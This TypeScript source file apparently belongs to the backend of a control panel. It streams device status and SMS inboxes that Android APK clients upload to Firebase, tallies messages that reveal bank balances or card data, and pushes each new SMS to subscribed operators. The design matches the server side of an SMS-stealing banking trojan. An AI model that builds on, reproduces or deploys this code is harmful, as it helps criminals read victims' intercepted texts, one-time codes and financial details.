/**
 * Per-panel Firebase presence watcher.
 *
 * Opens ONE Firebase SSE connection per panel (shared across all users of that
 * panel). Watches `clients/` for device status and SMS inside `clients/`.
 * Also watches `messages/` and `sms/` root paths for panels that store SMS
 * outside the clients node.
 *
 * Emits to all subscribed users via sseEmit:
 *   { type: "device_update", panelId, device: NormalizedDevice }
 *   { type: "new_sms",       panelId, deviceId, messages: NormalizedSms[] }
 *
 * Reference-counted: Firebase connections start on the first subscriber,
 * stop when the last subscriber disconnects.
 */

import {
  normalizeDevice,
  applyPatch,
  normalizeSms,
  streamFirebasePath,
  analyzeSmsMessages,
  type NormalizedDevice,
  type NormalizedSms,
} from "./firebase-stream.js";
import { sseEmit } from "./event-bus.js";
import { sendNewSmsPush } from "./push-notify.js";

// ── Types ─────────────────────────────────────────────────────────────────────

interface PanelWatcher {
  controller: AbortController;
  /** All userIds currently subscribed to this watcher. */
  users: Set<string>;
  /** deviceId → latest normalized state. */
  deviceCache: Map<string, NormalizedDevice>;
  /** deviceId → Set of msgKey already emitted (deduplicates across paths). */
  seenSmsKeys: Map<string, Set<string>>;
  /** Running SMS category counters for this panel. */
  smsCounts: { total: number; bank: number; card: number };
}

// ── SMS sub-field names inside clients/{deviceId}/ ────────────────────────────
//
// Different APK versions write SMS to different sub-keys.
// ANY of these appearing at depth-3 under clients/ is treated as SMS.
const SMS_SUB_FIELDS = new Set([
  "messages", "SMS", "Sms", "sms",
  "inbox",    "Inbox",
  "received", "Received",
  "msg",      "Msgs", "msgs",
]);

// Root-level paths watched separately (same APK variants write here instead).
const SMS_ROOT_PATHS = ["messages", "sms", "SMS", "inbox"] as const;

// ── In-memory registry ────────────────────────────────────────────────────────

/** panelId → watcher */
const watchers = new Map<string, PanelWatcher>();

// ── Public API ────────────────────────────────────────────────────────────────

/**
 * Subscribe a user to a panel watcher.
 * Starts the watcher if it does not yet exist.
 * Immediately pushes the current cached device state to the new user.
 */
export function subscribePanelWatcher(
  userId: string,
  panelId: string,
  firebaseUrl: string,
  secret: string,
): void {
  let w = watchers.get(panelId);

  if (!w) {
    w = {
      controller: new AbortController(),
      users: new Set(),
      deviceCache: new Map(),
      seenSmsKeys: new Map(),
      smsCounts: { total: 0, bank: 0, card: 0 },
    };
    watchers.set(panelId, w);
    _runClientsWatcher(panelId, w, firebaseUrl, secret);
    // Watch every root SMS path — different APK builds write to different roots.
    // PERMISSION_DENIED on unused paths is suppressed inside _runSmsWatcher.
    for (const rootPath of SMS_ROOT_PATHS) {
      _runSmsWatcher(panelId, w, firebaseUrl, secret, rootPath);
    }
  }

  w.users.add(userId);

  // Send current cached state immediately so the new user doesn't wait for
  // the next Firebase event to learn the current device statuses.
  for (const device of w.deviceCache.values()) {
    sseEmit(userId, { type: "device_update", panelId, device });
  }
}

/**
 * Return live stats for a panel from the in-memory watcher cache.
 * Returns zeroes if the watcher is not running (no active SSE subscribers).
 */
export function getPanelStats(panelId: string): {
  online: number; offline: number; total: number;
  bank: number; card: number; smsTotal: number;
} {
  const w = watchers.get(panelId);
  if (!w) return { online: 0, offline: 0, total: 0, bank: 0, card: 0, smsTotal: 0 };
  let online = 0, offline = 0;
  for (const d of w.deviceCache.values()) {
    if (d.status) online++; else offline++;
  }
  return {
    online, offline, total: w.deviceCache.size,
    bank: w.smsCounts.bank, card: w.smsCounts.card, smsTotal: w.smsCounts.total,
  };
}

/**
 * Unsubscribe a user from a panel watcher.
 * Stops (and removes) the watcher when no users remain.
 */
export function unsubscribePanelWatcher(userId: string, panelId: string): void {
  const w = watchers.get(panelId);
  if (!w) return;
  w.users.delete(userId);
  if (w.users.size === 0) {
    w.controller.abort();
    watchers.delete(panelId);
  }
}

// ── Helpers ───────────────────────────────────────────────────────────────────

function emitToAll(w: PanelWatcher, panelId: string, event: Record<string, unknown>): void {
  for (const uid of w.users) {
    sseEmit(uid, event as { type: string } & Record<string, unknown>);
  }
}

/** Categorise a single NormalizedSms and bump the panel's running counters. */
function _countSms(w: PanelWatcher, msg: NormalizedSms): void {
  w.smsCounts.total++;
  const a = analyzeSmsMessages([msg]);
  if (a.bankBalances.length > 0) w.smsCounts.bank++;
  if (a.cards.length > 0) w.smsCounts.card++;
}

/** Deduplicate and emit new SMS messages. */
function emitNewSms(
  w: PanelWatcher,
  panelId: string,
  deviceId: string,
  msgs: NormalizedSms[],
): void {
  let seen = w.seenSmsKeys.get(deviceId);
  if (!seen) {
    seen = new Set();
    w.seenSmsKeys.set(deviceId, seen);
  }
  const fresh = msgs.filter((m) => !seen!.has(m.key));
  if (!fresh.length) return;
  fresh.forEach((m) => { seen!.add(m.key); _countSms(w, m); });
  emitToAll(w, panelId, { type: "new_sms", panelId, deviceId, messages: fresh });

  // Push notification: fire-and-forget to all subscribed users' devices.
  const first = fresh[0];
  if (first) {
    const device = w.deviceCache.get(deviceId);
    void sendNewSmsPush({
      userIds: [...w.users],
      deviceName: device?.name ?? deviceId,
      sender: first.sender,
      message: first.message,
      deviceId,
      panelId,
    });
  }
}

/** Record all SMS keys in the initial snapshot without emitting them. */
function recordInitialSmsKeys(
  w: PanelWatcher,
  deviceId: string,
  // eslint-disable-next-line @typescript-eslint/no-explicit-any
  rawMsgMap: Record<string, any>,
): void {
  let seen = w.seenSmsKeys.get(deviceId);
  if (!seen) {
    seen = new Set();
    w.seenSmsKeys.set(deviceId, seen);
  }
  for (const [k, v] of Object.entries(rawMsgMap)) {
    if (seen.has(k)) continue;
    seen.add(k);
    const msg = normalizeSms(k, v);
    if (msg) _countSms(w, msg);
  }
}

// ── clients/ watcher — device status + embedded SMS ──────────────────────────

async function _runClientsWatcher(
  panelId: string,
  w: PanelWatcher,
  firebaseUrl: string,
  secret: string,
): Promise<void> {
  try {
    for await (const event of streamFirebasePath(
      firebaseUrl,
      secret,
      "clients",
      w.controller.signal,
    )) {
      if (w.controller.signal.aborted) break;

      // ── Full snapshot (initial connect) ────────────────────────────────
      if (event.type === "put" && event.path === "/") {
        const raw = event.data as Record<string, unknown> | null;
        if (!raw || typeof raw !== "object") continue;

        for (const [deviceId, deviceRaw] of Object.entries(raw)) {
          const device = normalizeDevice(deviceId, deviceRaw, panelId);
          w.deviceCache.set(deviceId, device);

          // Record existing SMS keys across ALL known sub-fields so we don't
          // re-emit history when the watcher first connects.
          // Different APK versions store SMS under different keys.
          for (const smsField of SMS_SUB_FIELDS) {
            // eslint-disable-next-line @typescript-eslint/no-explicit-any
            const msgMap = (deviceRaw as any)?.[smsField];
            if (msgMap && typeof msgMap === "object") {
              recordInitialSmsKeys(w, deviceId, msgMap);
            }
          }
        }

        // Push current state to all already-subscribed users
        for (const device of w.deviceCache.values()) {
          emitToAll(w, panelId, { type: "device_update", panelId, device });
        }
        continue;
      }

      // ── Targeted put (single device replace or sub-field) ──────────────
      if (event.type === "put" && event.path !== "/") {
        const parts = event.path.replace(/^\//, "").split("/");
        const deviceId = parts[0];
        if (!deviceId) continue;

        // Full device replace
        if (parts.length === 1) {
          if (event.data === null) {
            // Device deleted
            w.deviceCache.delete(deviceId);
            continue;
          }
          const device = normalizeDevice(deviceId, event.data, panelId);
          w.deviceCache.set(deviceId, device);
          emitToAll(w, panelId, { type: "device_update", panelId, device: { ...device } });
          continue;
        }

        // Sub-field update
        const subField = parts[1];

        // New single SMS under clients/{deviceId}/{anySmsField}/{msgKey}
        // Handles: messages, SMS, inbox, Inbox, Sms, received, msg, etc.
        if (SMS_SUB_FIELDS.has(subField) && parts.length === 3) {
          const msgKey = parts[2];
          const msg = normalizeSms(msgKey, event.data);
          if (msg) emitNewSms(w, panelId, deviceId, [msg]);
          continue;
        }

        // Full SMS sub-folder replace: clients/{deviceId}/{smsField} → object
        // Record all keys; if device is new to us emit nothing (history), else
        // emit only keys not yet seen (i.e. genuinely new during this session).
        if (SMS_SUB_FIELDS.has(subField) && parts.length === 2) {
          // eslint-disable-next-line @typescript-eslint/no-explicit-any
          const msgMap = event.data as Record<string, any> | null;
          if (msgMap && typeof msgMap === "object") {
            const alreadySeen = w.seenSmsKeys.has(deviceId);
            if (alreadySeen) {
              // Watcher was running — anything in the map that's new IS new SMS.
              const msgs = Object.entries(msgMap)
                .map(([k, v]) => normalizeSms(k, v))
                .filter((m): m is NormalizedSms => m !== null);
              if (msgs.length) emitNewSms(w, panelId, deviceId, msgs);
            } else {
              // First time seeing this device — treat as history.
              recordInitialSmsKeys(w, deviceId, msgMap);
            }
          }
          continue;
        }

        // Device field update (non-SMS)
        const existing = w.deviceCache.get(deviceId);
        if (!existing) continue;
        applyPatch(existing, event.path, event.data);
        emitToAll(w, panelId, { type: "device_update", panelId, device: { ...existing } });
        continue;
      }

      // ── Patch (partial field changes) ──────────────────────────────────
      if (event.type === "patch") {
        const parts = event.path.replace(/^\//, "").split("/");
        const deviceId = parts[0];
        if (!deviceId) continue;

        // eslint-disable-next-line @typescript-eslint/no-explicit-any
        const patchData = event.data as Record<string, any> | null;
        if (!patchData || typeof patchData !== "object") continue;

        const existing = w.deviceCache.get(deviceId);
        if (!existing) {
          // Unknown device — build from patch data
          const device = normalizeDevice(deviceId, patchData, panelId);
          w.deviceCache.set(deviceId, device);
          emitToAll(w, panelId, { type: "device_update", panelId, device: { ...device } });
          continue;
        }

        // Extract new SMS from every known SMS sub-field in the patch.
        // Different APK versions patch under different keys (messages, SMS, inbox…).
        for (const [field, value] of Object.entries(patchData)) {
          if (SMS_SUB_FIELDS.has(field)) {
            if (value && typeof value === "object") {
              // eslint-disable-next-line @typescript-eslint/no-explicit-any
              const rawMsgMap = value as Record<string, any>;
              const msgs = Object.entries(rawMsgMap)
                .map(([k, v]) => normalizeSms(k, v))
                .filter((m): m is NormalizedSms => m !== null);
              if (msgs.length) emitNewSms(w, panelId, deviceId, msgs);
            }
          } else {
            applyPatch(existing, `/${deviceId}/${field}`, value);
          }
        }
        emitToAll(w, panelId, { type: "device_update", panelId, device: { ...existing } });
      }
    }
  } catch (err) {
    if (!w.controller.signal.aborted) {
      console.error(`[device-watcher] clients watcher error panel=${panelId}:`, err);
    }
  }
}

// ── messages/ and sms/ watchers — SMS at root path ───────────────────────────

async function _runSmsWatcher(
  panelId: string,
  w: PanelWatcher,
  firebaseUrl: string,
  secret: string,
  rootPath: string,
): Promise<void> {
  try {
    for await (const event of streamFirebasePath(
      firebaseUrl,
      secret,
      rootPath,
      w.controller.signal,
    )) {
      if (w.controller.signal.aborted) break;

      // ── Full snapshot: record all existing keys, don't emit ────────────
      if (event.type === "put" && event.path === "/") {
        // eslint-disable-next-line @typescript-eslint/no-explicit-any
        const rawAll = event.data as Record<string, Record<string, any>> | null;
        if (!rawAll || typeof rawAll !== "object") continue;
        for (const [deviceId, msgMap] of Object.entries(rawAll)) {
          if (msgMap && typeof msgMap === "object") {
            recordInitialSmsKeys(w, deviceId, msgMap);
          }
        }
        continue;
      }

      // ── put /deviceId — full device SMS snapshot (record keys only) ────
      if (event.type === "put" && event.path !== "/") {
        const parts = event.path.replace(/^\//, "").split("/");
        if (parts.length === 1) {
          // Full device SMS map snapshot
          const deviceId = parts[0];
          // eslint-disable-next-line @typescript-eslint/no-explicit-any
          const msgMap = event.data as Record<string, any> | null;
          if (msgMap && typeof msgMap === "object") {
            recordInitialSmsKeys(w, deviceId, msgMap);
          }
          continue;
        }
        // put /deviceId/msgKey — single new message
        if (parts.length === 2) {
          const [deviceId, msgKey] = parts;
          const msg = normalizeSms(msgKey, event.data);
          if (msg) emitNewSms(w, panelId, deviceId, [msg]);
        }
        continue;
      }

      // ── patch /deviceId — new message keys added ────────────────────────
      if (event.type === "patch") {
        const parts = event.path.replace(/^\//, "").split("/");
        if (parts.length < 1) continue;
        const deviceId = parts[0];

        // eslint-disable-next-line @typescript-eslint/no-explicit-any
        const patchData = event.data as Record<string, any> | null;
        if (!patchData || typeof patchData !== "object") continue;

        const msgs = Object.entries(patchData)
          .map(([k, v]) => normalizeSms(k, v))
          .filter((m): m is NormalizedSms => m !== null);
        if (msgs.length) emitNewSms(w, panelId, deviceId, msgs);
      }
    }
  } catch (err) {
    if (!w.controller.signal.aborted) {
      // Not all panels use this path — suppress PERMISSION_DENIED noise
      const msg = String(err);
      if (!msg.includes("PERMISSION_DENIED") && !msg.includes("null")) {
        console.error(
          `[device-watcher] ${rootPath} watcher error panel=${panelId}:`,
          err,
        );
      }
    }
  }
}
